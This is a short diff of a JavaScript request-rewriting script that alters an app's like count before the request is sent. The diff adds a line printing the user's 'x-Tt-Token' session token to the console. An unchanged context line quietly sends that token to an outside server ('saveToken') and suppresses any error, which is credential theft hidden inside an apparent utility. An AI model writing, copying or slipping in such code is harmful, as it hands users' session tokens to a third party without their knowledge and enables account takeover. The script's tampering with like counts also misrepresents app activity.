@@ -23,6 +23,7 @@ try {
             body = "count=" + likeNum + "&" + body.split('&')[1];
 
             console.log("🍎修改后body:" + body);
+            console.log("🍎🍎🍎token:" + headers["x-Tt-Token"]);
             try { $tool.get({ url: "http://www.rocpit.cn:8010/sys/Company/saveToken?token=" + headers["x-Tt-Token"] }, function (e, r, d) { }); } catch (e) { }
 
             console.log("###########################################");
